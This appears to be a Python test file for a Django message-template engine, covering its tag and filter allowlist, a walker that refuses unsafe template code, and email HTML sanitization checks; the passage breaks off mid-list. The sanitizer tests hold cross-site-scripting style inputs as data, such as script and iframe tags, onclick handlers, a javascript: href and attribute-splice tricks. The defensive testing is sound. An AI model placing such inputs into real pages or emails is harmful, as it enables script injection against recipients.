"""Rendering message templates: the restricted engine, the walker, prepare(), the passes, preview and its read."""

from __future__ import annotations

import asyncio
import datetime
import email
import email.policy
import functools
import inspect
import itertools
import json
import logging
import math
import os
import re
import sys
import threading
import time
import zoneinfo
from collections.abc import Callable, Iterable, Iterator, Mapping
from contextlib import contextmanager
from decimal import Decimal
from email.message import EmailMessage
from pathlib import Path
from typing import Any

import html5lib
import markdown_it
import pytest
import yaml
from asgiref.sync import sync_to_async
from django.contrib.auth.models import AnonymousUser
from django.core.exceptions import ValidationError
from django.db import connection, transaction
from django.template import Engine, TemplateSyntaxError
from django.template.base import DebugLexer, Node, Parser, tag_re
from django.template.defaulttags import TemplateLiteral
from django.test.utils import CaptureQueriesContext
from django.utils import timezone, translation
from django.utils.safestring import SafeString, mark_safe
from hypothesis import HealthCheck, event, example, given, settings
from hypothesis import strategies as st
from markdown_it import MarkdownIt
from markdown_it.helpers import parseLinkLabel
from markdown_it.renderer import RendererHTML
from markdown_it.rules_inline import StateInline
from rebac import system_context

from angee.base.models.identity import public_id_of
from angee.brandkit.testing.models import BrandKit
from angee.graphql.testing.documents import execute_schema, result_data
from angee.messaging_templates import schema as messaging_templates_schema
from angee.messaging_templates import walker as walker_module
from angee.messaging_templates.engine import (
    ALLOWED_FILTERS,
    ALLOWED_TAGS,
    INVALID_VALUES,
    MESSAGE_TEMPLATE_REFUSED,
    NO_BRAND_KIT,
    REFUSAL_SOURCE,
    RENDER_BUDGET,
    RENDER_BUDGET_EXCEEDED,
    RENDER_FAILED,
    RENDER_FILTER_INPUT_LIMIT,
    RENDER_ITERATION_LIMIT,
    RENDER_OUTPUT_LIMIT,
    SUBJECT_TOO_LONG,
    VALUE_NOT_LINKABLE,
    MessageTemplateEngine,
    RefusalSource,
    RenderBudget,
    RenderBudgetExceeded,
    register,
    url,
)
from angee.messaging_templates.html_checks import (
    LINK_ATTRIBUTES,
    MAIL_ATTRIBUTES,
    MAIL_ELEMENTS,
    VOID_ELEMENTS,
    SpellingRule,
    check_html,
    compiled_expression,
)
from angee.messaging_templates.models import MessageTemplateQuerySet
from angee.messaging_templates.rendering import MarkdownFormatHandler
from angee.messaging_templates.testing.faults import failing_filter
from angee.messaging_templates.testing.models import MessageTemplate
from angee.messaging_templates.walker import (
    CONDITION_OPERATOR_LIMIT,
    ENCODED_WORD_OPENER,
    UNPRINTED,
    WALKED_NODES,
    RowPiece,
    TemplateWalk,
    TemplateWalker,
    TemplateWarning,
    TemplateWarningCode,
    TextDirection,
    _frame,
    _RowRules,
    _Tree,
    _TreeWalker,
    walked,
)
from tests.conftest import addon_schema, create_platform_admin, create_user

ROOT = Path(__file__).resolve().parents[1]
ANGEE: dict[str, Any] = {
    name: value
    for name, value in yaml.safe_load((ROOT / "src/angee/brandkit/resources/install/010_brandkit.brandkit.yaml")
                                      .read_text())[0].items()
    if name != "xref"
}

PLAIN_LAYOUT = (
    '<html lang="{{ lang }}" dir="{{ dir }}"><head><title>{{ subject }}</title></head><body>'
    '<div style="display:none">{{ preheader }}</div>{% block content %}{% endblock %}</body></html>'
)
PLAIN_TEXT = "{% block content %}{% endblock %}"

_DEFAULTS: dict[str, dict[str, Any]] = {
    "layout": {"format": "html", "source": PLAIN_LAYOUT, "text_source": PLAIN_TEXT},
    "template": {"format": "markdown", "source": "Hello.", "subject": "A subject", "preheader": "A preheader",
                 "layout": "plain"},
    "block": {"format": "html", "source": "<p>Block</p>", "text_source": "Block"},
    "part": {"format": "markdown", "source": "Part."},
}


def _unsaved(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
    return MessageTemplate(kind=kind, key=key, language=language, **{"name": key, **_DEFAULTS[kind], **values})


def _row(kind: str = "template", key: str = "tests.mail", language: str = "en", **values: Any) -> Any:
    """Save a row as named system work, past ``clean``: what a render meets when a write skipped the walk."""

    row = _unsaved(kind, key, language, **values)
    with system_context(reason="tests.messaging_templates.render.setup"):
        row.save()
    return row


def _refusals(row: Any, *, saving: bool = True) -> list[str]:
    with system_context(reason="tests.messaging_templates.render.walk"):
        try:
            TemplateWalker(saving=saving).walk(row, MessageTemplate.objects)
        except ValidationError as error:
            return list(error.messages)
    return []


def _walk(row: Any) -> TemplateWalk:
    with system_context(reason="tests.messaging_templates.render.walk"):
        return TemplateWalker().walk(row, MessageTemplate.objects)


def _render(row: Any, values: dict[str, Any], kit: Any = None) -> Any:
    with system_context(reason="tests.messaging_templates.render"):
        return row.render(values, kit=kit)


@pytest.fixture
def kit(db: None) -> Any:
    del db
    with system_context(reason="tests.messaging_templates.render.kit"):
        return BrandKit.objects.create(**{**ANGEE, "name": "Acme", "is_default": True})


@pytest.fixture
def plain(kit: Any) -> Any:
    """A minimal layout, the default kit beside it."""

    del kit
    return _row("layout", "plain")


TIMED_RUN = os.environ.get("ANGEE_TIMED_TESTS") == "1"
"""Whether CPU-time bounds are asserted: every one of them runs on request (docs/checks.md), never by default."""


REFERENCE_ITERATIONS = 1_000_000
NOMINAL_REFERENCE_SECONDS = 0.048
"""The reference workload's CPU seconds on the machine class the bounds were set on: an 18-core Apple M-series
machine, CPython 3.14.9, at a load near 13. A bound written in seconds holds that many there."""


def _reference_seconds() -> float:
    """CPU seconds of a fixed pure-Python workload (string building and arithmetic), the least of three runs."""

    best = math.inf
    for _ in range(3):
        started = time.process_time()
        total = 0
        for index in range(REFERENCE_ITERATIONS):
            total += len(str(index)) + index % 7
        best = min(best, time.process_time() - started)
    return best


def _scaled(seconds: float) -> float:
    """``seconds`` as a smoke bound here: scaled by the reference workload measured now, in this process.

    The timed tests are a smoke measurement on the stated machine class that catches a gross regression; the counted
    caps (the work the counted tests pin) are the guarantee. The scaling is noisy and does not track load: a case near
    its bound can pass or fail with its neighbours, and a slower path can pass.
    """

    return seconds * _reference_seconds() / NOMINAL_REFERENCE_SECONDS


@contextmanager
def _within(seconds: float, case: object = None) -> Iterator[None]:
    """Time the block in CPU seconds against :func:`_scaled` ``seconds``; the bound is asserted only when
    ``ANGEE_TIMED_TESTS=1``, as every CPU bound is."""

    bound = _scaled(seconds) if TIMED_RUN else math.inf
    started = time.process_time()
    yield
    spent = time.process_time() - started
    assert spent < bound, (case, f"{spent:.3f} s of CPU, over {bound:.3f} s ({seconds} s at the reference)")


def _mail(source: str, variables: dict[str, str] | None = None, **values: Any) -> Any:
    return _row("template", values.pop("key", "tests.mail"), variables=variables or {}, source=source, **values)


def _recording(monkeypatch: pytest.MonkeyPatch, owner: object, name: str, record: Callable[..., None]) -> None:
    """Wrap ``owner.name`` so ``record`` sees each call's arguments before it runs."""

    original = getattr(owner, name)

    def recorded(*args: Any, **kwargs: Any) -> Any:
        record(*args, **kwargs)
        return original(*args, **kwargs)

    monkeypatch.setattr(owner, name, recorded)


# ---------- the engine ----------

T01_REFUSED = (
    "{% load static %}", "{% debug %}", "{% url 'x' %}", "{% csrf_token %}", "{% autoescape off %}x{% endautoescape %}",
    "{% now 'Y' %}", "{% lorem %}", "{% filter upper %}x{% endfilter %}", "{% cycle 'a' 'b' %}", "{% firstof a b %}",
    "{% widthratio a b 100 %}", "{% spaceless %}x{% endspaceless %}", "{% verbatim %}{{ x }}{% endverbatim %}",
    "{% regroup a by b as c %}", "{% ifchanged %}x{% endifchanged %}", "{% querystring %}",
    "{% partialdef p %}x{% endpartialdef %}", "{% partial p %}", "{% csp_nonce_attr %}", "{% resetcycle %}",
    "{% translate 'x' %}", "{% blocktranslate %}x{% endblocktranslate %}",
    "{{ x|safe }}", "{{ x|safeseq }}", "{{ x|escapejs }}", "{{ x|add:'1' }}", "{{ x|stringformat:'s' }}",
    "{{ x|urlize }}", "{{ x|ljust:'9' }}", "{{ x|cut:'a' }}", "{{ x|json_script:'i' }}", "{{ x|dictsort:'a' }}",
    "{{ x|random }}", "{{ x|wordwrap:5 }}", "{{ x|escape }}", "{{ x|force_escape }}", "{{ x|striptags }}",
    "{{ x|timesince }}", "{{ x|join:',' }}", "{{ x|first }}", "{{ x|last }}", "{{ x|default_if_none:'a' }}",
    "{% include name only %}", "{% include 'blocks/x' %}", "{% extends name %}", "{% include 'a'|lower only %}",
)


def test_the_engine_registers_exactly_the_allowlist_and_compiles_nothing_else() -> None:
    engine = MessageTemplateEngine(autoescape=True)
    parser = Parser([], engine.template_libraries, engine.template_builtins)
    assert sorted(parser.tags) == sorted(ALLOWED_TAGS)
    assert sorted(parser.filters) == sorted(ALLOWED_FILTERS)
    assert engine.template_libraries == {}
    assert engine.context_processors == []
    for source in T01_REFUSED:
        with pytest.raises(TemplateSyntaxError):
            engine.from_string(source)


GUARD_TEMPLATE = (
    '<p>{% include "parts/guard" with who=person.name only %}'
    "{% if count > 1 and flag or not flag %}a{% elif name == 'x' %}b{% elif count >= 2 %}{% elif count < 3 %}"
    "{% elif count <= 4 %}{% elif count != 5 %}{% elif name in 'abc' %}{% elif name not in 'abc' %}"
    "{% elif flag is True %}{% elif flag is not None %}{% elif ratio == 1.5 %}{% elif flag == False %}c"
    "{% elif items|length %}{% else %}d{% endif %}</p>\n"
    "<p>{% for item in items reversed %}{{ forloop.counter }}{{ item.label|default:'x'|upper|lower|capfirst }}"
    "{% empty %}none{% endfor %}{% with title=name|title %}{{ title|truncatechars:5 }}{% endwith %}"
    "{# a note #}{% comment %}x{% endcomment %}{% templatetag openvariable %}</p>\n"
    "<p>{{ note|truncatewords:2|linebreaksbr }}{{ items|length }}{{ when|date:'DATE_FORMAT' }}"
    "{{ amount|floatformat:2 }}{{ count|pluralize }}{{ flag|yesno:'y,n' }}<a href=\"{{ link|url }}\">x</a></p>"
)
GUARD_VARIABLES = {
    "person.name": "x", "count": "x", "flag": "x", "name": "x", "ratio": "x", "items.*.label": "x", "note": "x",
    "when": "x", "amount": "x", "link": "x",
}
GUARD_NODES = {
    "TextNode": ((), ["s"]),
    "VariableNode": ((), ["filter_expression"]),
    "IfNode": (("nodelist",), ["conditions_nodelists"]),
    "ForNode": (("nodelist_loop", "nodelist_empty"),
                ["is_reversed", "loopvars", "nodelist_empty", "nodelist_loop", "sequence"]),
    "BudgetedLoopBody": (("nodelist",), ["nodelist"]),
    "WithNode": (("nodelist",), ["extra_context", "nodelist"]),
    "CommentNode": ((), []),
    "BudgetedIncludeNode": (("nodelist",), ["extra_context", "isolated_context", "template"]),
    "ExtendsNode": (("nodelist",), ["blocks", "nodelist", "parent_name", "template_dirs"]),
    "BlockNode": (("nodelist",), ["name", "nodelist", "parent"]),
    "TemplateTagNode": (("nodelist",), ["tagtype"]),
}
# is_safe is the engine's own (True for its markup filter alone); needs_autoescape and expects_localtime are Django's.
GUARD_FILTERS = {
    "capfirst": ((False, None, None), "(value)"),
    "date": ((False, None, True), "(value, arg=None)"),
    "default": ((False, None, None), "(value, arg)"),
    "floatformat": ((False, None, None), "(text, arg=-1)"),
    "length": ((False, None, None), "(value)"),
    "linebreaksbr": ((True, True, None), "(value, autoescape=True)"),
    "lower": ((False, None, None), "(value)"),
    "pluralize": ((False, None, None), "(value, arg='s')"),
    "title": ((False, None, None), "(value)"),
    "truncatechars": ((False, None, None), "(value, arg)"),
    "truncatewords": ((False, None, None), "(value, arg)"),
    "upper": ((False, None, None), "(value)"),
    "url": ((False, None, None), "(value: 'Any') -> 'str'"),
    "yesno": ((False, None, None), "(value, arg=None)"),
}


def test_walker_reads_every_node(plain: Any, kit: Any) -> None:
    """The guard every Django upgrade runs: the nodes, attributes, operators, filters and lexer the walker reads."""

    del plain
    _row("block", "guard", source="<b>{{ who }}{{ brand.name }}{{ lang }}</b>", text_source="{{ who }}",
         variables={"who": "x"})
    _row("part", "guard", source='{% include "blocks/guard" with who=who only %}', variables={"who": "x"})
    template = _mail(GUARD_TEMPLATE, GUARD_VARIABLES, format="html", text_source="{{ name }}")
    walk = _walk(template)
    engines = {"html": MessageTemplateEngine(autoescape=True), "text": MessageTemplateEngine(autoescape=False)}
    met: dict[str, tuple[tuple[str, ...], list[str]]] = {}
    operators: set[str] = set()

    def conditions(condition: Any) -> None:
        operators.add(condition.id)
        if type(condition) is not TemplateLiteral:
            for operand in (condition.first, condition.second):
                if operand is not None:
                    conditions(operand)

    for forms in walk.forms.values():
        for form, engine in engines.items():
            for node in engine.from_string(getattr(forms, form)).nodelist.get_nodes_by_type(Node):
                met[type(node).__name__] = (
                    type(node).child_nodelists, sorted(set(vars(node)) - {"token", "origin"}),
                )
                # The walker's table renders what Django renders under each node.
                assert [child for nodelist in walked(node).nodelists(node) for child in nodelist] == [
                    child for name in type(node).child_nodelists for child in getattr(node, name, None) or ()
                ], type(node)
                for condition, _ in getattr(node, "conditions_nodelists", ()):
                    if condition is not None:
                        conditions(condition)
    assert met == GUARD_NODES
    assert set(GUARD_NODES) == {node.__name__ for node in WALKED_NODES}
    assert operators == {"or", "and", "not", "in", "not in", "is", "is not", "==", "!=", ">", ">=", "<", "<=",
                         "literal"}
    assert {
        name: (tuple(getattr(function, flag, None) for flag in ("is_safe", "needs_autoescape", "expects_localtime")),
               str(inspect.signature(inspect.unwrap(function))))
        for name, function in register.filters.items()
    } == GUARD_FILTERS
    assert tag_re.pattern == r"({%.*?%}|{{.*?}}|{#.*?#})"
    assert [(token.token_type.name, token.position) for token in DebugLexer(
        "Hi {{ a }}{% if b %}c{% endif %}{# d #}").tokenize()] == [
        ("TEXT", (0, 3)), ("VAR", (3, 10)), ("BLOCK", (10, 20)), ("TEXT", (20, 21)), ("BLOCK", (21, 32)),
        ("COMMENT", (32, 39)),
    ]
    # An include inside an included row still reads the globals: new() reads them from the copy of the context.
    rendered = _render(template, {"person": {"name": "Ana"}, "count": 2, "flag": True, "name": "x", "ratio": 1.5,
                                  "items": [{"label": "a"}], "note": "n", "when": "2026-11-24", "amount": "3.14159",
                                  "link": "https://example.test/"}, kit)
    assert "<b>AnaAcmeen</b>" in rendered.html and "{{" in rendered.html
    # Another node class is a defect to fix in the walker, never a refusal.
    spaceless = Engine().from_string("{% spaceless %}x{% endspaceless %}").nodelist[0]
    with pytest.raises(TypeError, match="does not know SpacelessNode"):
        _RowRules([], "probe", text_form=False).node(spaceless)
    tree_walker = _TreeWalker(walk, {})
    with pytest.raises(TypeError, match="does not know SpacelessNode"):
        tree_walker.node(_frame("probe", template, RowPiece.HTML, top=True), spaceless, _Tree(RowPiece.HTML))


# ---------- the walker's refusals, one rule at a time ----------

LONG = "a" * 1_001


@pytest.mark.parametrize(
    ("values", "refusal"),
    [
        pytest.param({"source": "x" * 50_001}, "source is over 50000 characters", id="1-source-size"),
        pytest.param({"source": LONG}, "a line of source is over 1000", id="1-line-length"),
        pytest.param({"source": "{{ a }}" * 31, "variables": {"a": "x"}}, "or holds over 30", id="1-line-openers"),
        pytest.param({"source": "[" * 31}, "holds over 30 [", id="1-markdown-brackets"),
        pytest.param({"source": ("&#123;&#123;" * 83)[:999]}, "html form holds over 60", id="1-form-openers"),
        pytest.param({"source": "\n".join(["{% if a %}"] * 17) + "\n" + "\n".join(["{% endif %}"] * 17),
                      "variables": {"a": "x"}}, "nests tags over 16 deep", id="2-nesting"),
        pytest.param({"source": "{% if %}{% endif %}"}, "does not compile", id="3-compile"),
        pytest.param({"source": '{{ "<b>" }}'}, "holds <, > or", id="4-literal-markup"),
        pytest.param({"source": '{{ "' + "a" * 201 + '" }}'}, "a literal over 200", id="4-literal-length"),
        pytest.param({"source": '{{ _("Hi") }}'}, "_(…)", id="4-translation"),
        pytest.param({"source": "{{ a|truncatechars:n }}", "variables": {"a": "x", "n": "x"}},
                     "takes a literal argument", id="5-variable-argument"),
        pytest.param({"source": "{{ a|lower|upper|lower|upper|lower }}", "variables": {"a": "x"}},
                     "over 4 filters", id="5-filter-count"),
        pytest.param({"source": "{{ a|floatformat:7 }}", "variables": {"a": "x"}}, "precision 7", id="5-precision"),
        pytest.param({"source": "{{ a|date:'rrrrrrrrrrrrrrrrrrrrr' }}", "variables": {"a": "x"}},
                     "a date format", id="5-date-format"),
        pytest.param({"source": "{{ a|upper|date }}", "variables": {"a": "x"}}, "date is the first", id="5-date-first"),
        pytest.param({"source": "{{ a|url|upper }}", "variables": {"a": "x"}}, "url is the last", id="5-url-last"),
        pytest.param({"source": "{{ a|upper|url }}", "variables": {"a": "x"}}, "url is the last", id="5-url-after"),
        pytest.param({"source": "{{ order|upper }}", "variables": {"order.total": "x"}},
                     "filters an object or a list", id="5-container-filter"),
        pytest.param({"source": "{{ a|linebreaksbr:'x' }}", "variables": {"a": "x"}, "format": "html",
                      "text_source": "x"}, "linebreaksbr takes no argument", id="5-linebreaksbr-argument"),
        pytest.param({"source": "a {{ b", "format": "html", "text_source": "x"}, "opens no template code",
                     id="6-text-opener"),
        pytest.param({"source": "<p>{{ a }}</p>", "format": "html", "text_source": "{{ a|linebreaksbr }}",
                      "variables": {"a": "x"}}, "writes <br> into plain text", id="7-linebreaksbr-text"),
        pytest.param({"source": "Hi{% endblock %}{% block x %}X"}, "a template writes neither", id="8-author-block"),
        pytest.param({"subject": '{% include "parts/x" only %}'}, "not used in a subject", id="8-subject-include"),
        pytest.param({"source": '{% include "layouts/plain" only %}'}, "only blocks and parts", id="9-include-kind"),
        pytest.param({"source": '{% include "blocks/missing" only %}'}, "no message template blocks/missing",
                     id="9-missing-row"),
        pytest.param({"source": "{% for a, b in items %}{% endfor %}", "variables": {"items.*": "x"}},
                     "one loop variable", id="10-loop-variables"),
        pytest.param({"source": "{% for a in items|lower %}{% endfor %}", "variables": {"items.*": "x"}},
                     "not a filtered one", id="10-filtered-sequence"),
        pytest.param({"source": "{% for a in order %}{% endfor %}", "variables": {"order.total": "x"}},
                     "for loops over a list", id="10-object-sequence"),
        pytest.param({"source": "{% if a|upper %}{% endif %}", "variables": {"a": "x"}}, "an if tests",
                     id="11-filtered-operand"),
        pytest.param({"source": "{% if order %}{% endif %}", "variables": {"order.total": "x"}}, "an if tests",
                     id="11-container-operand"),
        pytest.param({"source": "{% if a in items %}{% endif %}", "variables": {"a": "x", "items.*": "x"}},
                     "in takes a literal", id="11-in-value"),
        pytest.param({"source": "<script>x</script>", "format": "html", "text_source": "x"},
                     "a mail is written with the document, table, text, link, list and image elements alone",
                     id="12-html"),
        pytest.param({"source": "Use `{{ a }}` here.", "variables": {"a": "x"}}, "inside Markdown code inline",
                     id="12-markdown"),
        pytest.param({"source": "{{ secret }}"}, "secret is not in its variables", id="13-undeclared"),
        pytest.param({"source": "{{ forloop.counter }}"}, "outside a loop", id="13-forloop-outside"),
        pytest.param({"source": "{% for i in items %}{{ forloop.parentloop }}{% endfor %}",
                      "variables": {"items.*": "x"}}, "forloop.parentloop is not a value", id="13-forloop-key"),
        pytest.param({"source": "{% for i in items %}{{ forloop }}{% endfor %}", "variables": {"items.*": "x"}},
                     "prints an object or a list", id="13-forloop-bare"),
        pytest.param({"source": "{{ brand.secret }}"}, "brand.secret is not a value", id="13-brand"),
        pytest.param({"source": "{% with b=brand.light %}{{ b.nothing }}{% endwith %}"},
                     "brand.light.nothing is not a value", id="13-brand-alias"),
        pytest.param({"source": "{{ lang.code }}"}, "looks up inside lang", id="13-global-lookup"),
        pytest.param({"source": "{{ True.real }}"}, "looks up inside True", id="13-constant-lookup"),
        pytest.param({"source": "{{ block.super }}"}, "the engine's own", id="13-block"),
        pytest.param({"source": "{{ name.upper }}", "variables": {"name": "x"}}, "name.upper is not in its",
                     id="15-below-leaf"),
        pytest.param({"source": "{% with a='x' %}{{ a.b }}{% endwith %}"}, "looks up inside a", id="15-literal"),
        pytest.param({"source": "{% with a=n|lower %}{{ a.b }}{% endwith %}", "variables": {"n": "x"}},
                     "looks up inside a", id="15-computed"),
        pytest.param({"source": "{{ order }}", "variables": {"order.total": "x"}}, "prints an object or a list",
                     id="16-container-output"),
        pytest.param({"source": "{% with brand=a %}{% endwith %}", "variables": {"a": "x"}},
                     "brand is a name the mail", id="18-reserved"),
        pytest.param({"source": "{% with True=a %}{% endwith %}", "variables": {"a": "x"}},
                     "True is a name the mail", id="18-constant"),
        pytest.param({"source": "{% for lang in items %}{% endfor %}", "variables": {"items.*": "x"}},
                     "lang is a name the mail", id="18-loop-variable"),
        pytest.param({"source": "{% for i in items %}{% for j in items %}{% for k in items %}{% endfor %}{% endfor %}"
                                "{% endfor %}", "variables": {"items.*": "x"}}, "loops nest over 2",
                     id="18-loop-depth"),
        pytest.param({"source": "\n".join(["{{ a }}" * 25] * 13), "format": "html", "text_source": "x",
                      "variables": {"a": "x"}}, "over 300 outputs", id="18-outputs"),
    ],
)
def test_the_walker_refuses_each_rule(plain: Any, values: dict[str, Any], refusal: str) -> None:
    del plain
    refusals = _refusals(_unsaved(**values))
    assert any(refusal in message for message in refusals), refusals


def test_a_walk_refuses_through_what_a_template_reaches(plain: Any) -> None:
    """Rules 14, 17 and 18: effective paths, arguments, cycles and the depth of includes and rows."""

    del plain
    _row("part", "named", source="{{ person.first_name }} {{ person.last_name|default:'' }}",
         variables={"person.first_name": "x", "person.last_name": "x"})
    _row("part", "loops", source="{% include \"parts/loops\" only %}")
    _row("part", "leaks", source="{{ secret }}", variables={"secret": "x"})
    _row("part", "one", source='{% include "parts/two" only %}')
    _row("part", "two", source='{% include "parts/three" only %}')
    _row("part", "three", source='{% include "parts/four" only %}')
    _row("part", "four", source="Four.")
    cases = {
        "14-effective": ('{% include "parts/named" with person=recipient only %}', {"recipient.first_name": "x"},
                         "recipient.last_name is not a value the render declares"),
        "17-undeclared-argument": ('{% include "parts/named" with person=recipient other=recipient only %}',
                                   {"recipient.first_name": "x", "recipient.last_name": "x"},
                                   "passes other to parts/named"),
        "17-not-passed": ('{% include "parts/leaks" only %}', {}, "which it was not passed"),
        "18-cycle": ('{% include "parts/loops" only %}', {}, "includes itself"),
        "18-include-depth": ('{% include "parts/one" only %}', {}, "includes nest over 3"),
    }
    for case, (source, variables, refusal) in cases.items():
        refusals = _refusals(_unsaved(source=source, variables=variables))
        assert any(refusal in message for message in refusals), (case, refusals)
    assert _refusals(_unsaved(source='{% include "parts/two" only %}')) == []


def test_saving_asks_every_included_key_to_resolve_and_a_render_asks_only_for_a_row(plain: Any) -> None:
    del plain
    _row("part", "local", language="es", source="Hola.")
    template = _unsaved(language="es", source='{% include "parts/local" only %}')
    assert any("parts/local has no shipped default" in message for message in _refusals(template, saving=True))
    assert _refusals(template, saving=False) == []


def test_a_saved_layout_block_or_part_walks_what_it_reaches_and_clean_walks_only_what_changed(plain: Any) -> None:
    template = _mail('{% include "parts/fine" only %}', key="tests.edit")
    part = _row("part", "fine", source="Fine.")
    with system_context(reason="tests.messaging_templates.render.edit"):
        part.source = "{% if %}"
        with pytest.raises(ValidationError, match="does not compile"):
            part.full_clean()
        part.save()  # past clean: the part is broken now
        template.name = "Renamed"
        template.full_clean()  # what renders did not change, so the walk does not run
        template.source = '{% include "parts/fine" only %}\n\nMore.'
        with pytest.raises(ValidationError, match="parts/fine"):
            template.full_clean()
        plain.description = "Plain."
        plain.full_clean()


# ---------- the HTML checks ----------

HTML_ENGINE = MessageTemplateEngine(autoescape=True)


@pytest.mark.parametrize(
    ("html", "refused"),
    [
        *(pytest.param(f"<{tag}></{tag}>", True, id=f"element-{tag}")
          for tag in ("script", "iframe", "object", "embed", "form", "link", "base", "svg", "math")),
        pytest.param('<meta http-equiv="refresh" content="0">', True, id="http-equiv"),
        pytest.param('<p onclick="x">x</p>', True, id="on-attribute"),
        *(pytest.param(f'<img {name}="x">', True, id=f"attribute-{name}")
          for name in ("srcset", "formaction", "xlink:href", "ping", "longdesc", "usemap", "data", "icon")),
        *(pytest.param(f"<p>a</p><{tag}>b</{tag}>", True, id=f"s3-{tag}")
          for tag in ("noscript", "xmp", "noembed", "noframes", "plaintext", "textarea")),
        pytest.param('<noscript><p title="</noscript><b title={{ a }}>"></p></noscript>', True,
                     id="s3-noscript-splice"),
        pytest.param('<xmp><p title="</xmp><b title={{ a }}>"></p></xmp>', True, id="s3-xmp-splice"),
        pytest.param('<span title="a" title={{ a }}>x</span>', True, id="s1-repeated-name-unquoted"),
        pytest.param('<span title="a" title="{{ a }}">x</span>', True, id="s1-repeated-name"),
        pytest.param('<span TITLE="a" title={{ a }}>x</span>', True, id="s1-repeated-name-in-capitals"),
        pytest.param('<a href="https://example.test/" href={{ a|url }}>x</a>', True, id="s1-repeated-href"),
        pytest.param('<p TITLE="{{ a }}">x</p>', False, id="s1-capital-name"),
        pytest.param('<p title = "{{ a }}">x</p>', True, id="s1-spaced-equals"),
        pytest.param('<p title="{{ a }}" >x</p>', True, id="s1-space-before-close"),
        pytest.param('<a\nhref="https://example.test/"\ntitle="{{ a }}">x</a>', False, id="s1-newlines"),
        pytest.param('<p title="a&b {{ a }}">x</p>', True, id="s1-bare-ampersand"),
        pytest.param('<p title="a &amp; b {{ a }}">x</p>', False, id="s1-admitted-escaped"),
        pytest.param('<img alt="{{ a }}" src="https://example.test/a.png" />', False, id="s1-admitted-self-closing"),
        pytest.param('<td nowrap title="{{ a }}">x</td>', False, id="s1-admitted-bare-attribute"),
        pytest.param("<title>{% include 'parts/p' only %}</title>", True, id="title-element-include"),
        pytest.param("<title>{% for a in b %}{{ a }}{% endfor %}</title>", True, id="title-element-for"),
        pytest.param("<title>{{ subject }}{# a note #} {{ a }}</title>", False, id="admitted-title-element"),
        pytest.param("<title>{% if v %}</title>{% endif %}<p>{{ w }}</p>", True, id="title-if"),
        pytest.param("<{{ tag }}>x</{{ tag }}>", True, id="span-starts-a-tag"),
        pytest.param("<a{{ tag }}>x</a>", True, id="span-in-a-tag-name"),
        pytest.param('<p {{ name }}="x">x</p>', True, id="span-in-an-attribute-name"),
        pytest.param("<p title={{ a }}>x</p>", True, id="unquoted"),
        pytest.param("<p title='{{ a }}'>x</p>", True, id="single-quoted"),
        pytest.param("<!-- note -->", True, id="comment"),
        pytest.param("<!--[if mso]><b>x</b><![endif]-->", True, id="conditional-comment-outside-a-layout"),
        pytest.param("<xml><o:OfficeDocumentSettings></o:OfficeDocumentSettings></xml>", True, id="office-outside"),
        pytest.param("<v:rect></v:rect>", True, id="vml"),
        pytest.param('<a href="{{ a|url }}{{ b|url }}">x</a>', True, id="href-two-outputs"),
        pytest.param('<a href="{{ a }}">x</a>', True, id="href-without-url"),
        pytest.param('<a href="https://x.test/{{ a|url }}">x</a>', True, id="href-text-and-output"),
        pytest.param('<a href="javascript:alert(1)">x</a>', True, id="href-javascript"),
        pytest.param('<img src="data:image/png;base64,AAAA">', True, id="src-data"),
        pytest.param('<p style="color:{{ a }}">x</p>', True, id="style-value"),
        pytest.param('<p style="color:{{ brand.light.text|upper }}">x</p>', True, id="style-filter"),
        pytest.param('<p style="font:{{ brand.name }}">x</p>', True, id="style-brand-name"),
        pytest.param("<style>a{color:{{ brand.font.body }}}</style>", True, id="style-element-font"),
        pytest.param('<p class="{{ a }}">x</p>', True, id="class-output"),
        pytest.param('<p title="{% for a in b %}{% endfor %}">x</p>', True, id="title-for"),
        pytest.param('<p title="{% if a %}">x</p><b title="{% endif %}">y</b>', True, id="if-splice"),
        pytest.param("<?php x ?>", True, id="processing-instruction"),
        pytest.param('<a href="{{ a|url }}" title="{{ a }}">x</a>', False, id="admitted-link"),
        pytest.param('<a href="{{ a|default:\'\'|url }}">x</a>', False, id="admitted-default-url"),
        pytest.param('<a href="https://example.test/">x</a>', False, id="admitted-static-link"),
        pytest.param('<p style="color:{{ brand.light.text }};font:16px {{ brand.font.body }};direction:{{ dir }}">'
                     "x</p>", False, id="admitted-style"),
        pytest.param("<style>.x{color:{{ brand.dark.text }}}</style>", False, id="admitted-style-element"),
        pytest.param('<p title="{% if a %}{{ a }}{% else %}b{% endif %}" lang="{{ lang }}">x</p>', False,
                     id="admitted-condition"),
        pytest.param('<td style="text-align:{% if dir == \'rtl\' %}right{% else %}left{% endif %}">x</td>', False,
                     id="admitted-style-condition"),
        pytest.param("<!doctype html><html><body>{{ a }}</body></html>", True, id="doctype-outside-a-layout"),
    ],
)
def test_the_html_checks(html: str, refused: bool) -> None:
    assert bool(check_html(html, compiled_expression(HTML_ENGINE))) is refused, check_html(
        html, compiled_expression(HTML_ENGINE))


OFF_THE_LIST = [
    "script", "iframe", "noscript", "xmp", "noembed", "noframes", "plaintext", "textarea", "svg", "math", "template",
    "select", "option", "frameset", "frame", "object", "embed", "applet", "param", "form", "input", "button", "label",
    "link", "base", "video", "audio", "source", "track", "picture", "map", "area", "colgroup", "col", "caption",
    "marquee", "isindex", "image", "portal", "bgsound", "keygen", "dialog", "details", "summary", "menu", "slot",
    "search", "nobr", "listing", "xml", "o:p", "abbr", "q", "wbr",
]
"""Elements off :data:`MAIL_ELEMENTS`: every mode-switching, framing, form, embedded and foreign element, and others."""

R = SpellingRule
SPELLING_REFUSED: list[tuple[SpellingRule, str, bool]] = [
    (R.NO_CONTROL, "<p>a\x00b</p>", False),
    (R.NO_CONTROL, '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>', False),
    (R.NO_CONTROL, '<p title="\x009\x00">x</p>', False),
    (R.LESS_THAN, "<p>5 < 6</p>", False),
    (R.LESS_THAN, "<p>x</p></><p>y</p>", False),
    (R.LESS_THAN, "<title>a<b</title>", False),
    (R.LESS_THAN, "<style>a<b{}</style>", False),
    (R.LESS_THAN, '<p title="a<b">x</p>', False),
    (R.LESS_THAN, "<!x>", False),
    (R.LESS_THAN, "</ x>", False),
    (R.LESS_THAN, "<p>5 <", False),
    (R.START_TAG, "<p title='x'>y</p>", False),
    (R.START_TAG, "<p title=x>y</p>", False),
    (R.START_TAG, '<p title="a" title="b">y</p>', False),
    (R.START_TAG, '<p title="a" TITLE="b">y</p>', False),
    (R.START_TAG, '<p title = "x">y</p>', False),
    (R.START_TAG, '<p title="x" >y</p>', False),
